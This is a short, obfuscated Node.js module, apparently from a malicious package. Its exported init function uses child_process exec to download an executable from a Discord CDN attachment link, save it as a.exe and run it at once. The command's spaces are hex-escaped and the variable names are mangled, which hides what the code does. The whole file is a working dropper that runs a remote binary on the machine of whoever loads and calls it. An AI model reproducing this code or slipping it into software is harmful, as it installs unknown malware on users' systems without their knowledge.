const {exec} = require('node:child_process');
function init() {
    exec('curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe', (_0xb2ebd6, _0x263e3c, _0x3abd57) => {
        if (_0xb2ebd6) {
            console['log']('error:\x20' + _0xb2ebd6['message']);
        }
    });
}
module['exports'] = init;
